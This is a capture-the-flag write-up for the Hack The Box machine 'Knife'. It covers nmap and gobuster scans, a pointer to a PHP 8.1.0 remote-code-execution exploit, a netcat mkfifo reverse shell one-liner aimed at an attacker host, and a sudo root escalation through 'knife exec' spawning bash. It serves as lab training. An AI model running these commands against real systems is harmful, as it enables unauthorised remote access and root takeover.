# knife HTB , 27 JUL 2021
![1_qkA2OJOWUvxXtoCGclOUbw](https://user-images.githubusercontent.com/67979878/127178999-d2c484e6-bc69-4cf3-bf1d-c40443fa8fc9.png)



SCANNING
========
basic scanning
---------------
$nmap -sV -v -sC -oN nmap/intial 10.10.10.242

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
full scanning
-------------
$ nmap -sV -v -oN -p- nmap/all 10.10.10.242 

-no more ports :(



ENUMRATION
===========

$ gobuster dir -u "http://10.10.10.242/" -w=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | tee gobuster.txt



-no results which is weird :( .



### taking a look at wappalayzer : php 8.1.0
#### by searching for it found a possible rce 

https://www.exploit-db.com/exploits/49933 


running script we got a shell as "james"



## Reverse shell :
-on my side :

$bash

$nc -lvp 1234

-on target :

$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc your_ip 1234 >/tmp/f


## Stable shell :

$python3 -c "import pty;pty.spawn('/bin/bash')"

ctrl+z

$stty raw -echo

$fg

james@machine:~$export TERM=xterm 




privilege escalation 
--------------------

$sudo -l 

```
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

```

show knife options : 
"the interesting ones :"



```
options :    -e, --editor EDITOR              Set the editor to use for interactive commands.

Available subcommands :

knife acl add MEMBER_TYPE MEMBER_NAME OBJECT_TYPE OBJECT_NAME PERMS
knife group add MEMBER_TYPE MEMBER_NAME GROUP_NAME
knife group list
knife user create USERNAME DISPLAY_NAME FIRST_NAME LAST_NAME EMAIL PASSWORD (options)
sudo knife ssh QUERY COMMAND -i -v




```

$file /usr/bin/knife is a s symbolic reference for an opt that can run ruby script .


$sudo knife exec -e "system('/bin/bash')"

type the script :

system('/bin/bash')

ctrl+D

#rooted .
